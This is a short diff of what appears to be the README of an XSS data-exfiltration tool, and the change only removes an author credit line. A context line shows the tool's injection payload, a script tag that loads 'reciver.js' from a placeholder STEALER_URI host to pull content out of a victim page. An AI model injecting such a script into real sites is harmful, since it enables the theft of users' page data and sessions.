@@ -59,6 +59,5 @@ Inject: **<script src="http://STEALER_URI:8080/reciver.js"></script>**
 ##### Extract content 
 ![image alt](https://i.imgur.com/QlSzAlB.png "2")
 _____________________________________________________________________________________________________________________________________________
-by [@j0moz4](https://twitter.com/J0MoZ4)
 
 **Thnx to:** [https://github.com/hoodoer/XSS-Data-Exfil](https://github.com/hoodoer/XSS-Data-Exfil)
